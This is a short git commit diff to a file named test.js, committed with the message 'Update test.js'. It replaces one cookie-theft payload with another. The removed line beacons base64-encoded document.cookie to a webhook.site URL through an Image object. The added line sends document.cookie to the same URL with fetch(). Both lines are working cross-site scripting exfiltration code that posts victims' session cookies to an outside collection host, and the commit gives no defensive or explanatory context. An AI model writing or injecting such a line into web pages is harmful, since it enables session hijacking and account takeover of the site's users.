26dd378b2b254ea8b816d233bdf601dfa1e6ed5b
Anuj Rattan <anuj.rattan99@gmail.com>
2024-10-09 22:07:55 +0000

    Update test.js

--- test.js
+++ test.js
@@ -1,1 +1,1 @@
-x = new Image(); x.src = 'https://webhook.site/92d9fd91-55be-4ce8-b91a-87ae6ba414b4?data='+btoa(document.cookie);
+fetch('https://webhook.site/92d9fd91-55be-4ce8-b91a-87ae6ba414b4?data=' + document.cookie)  
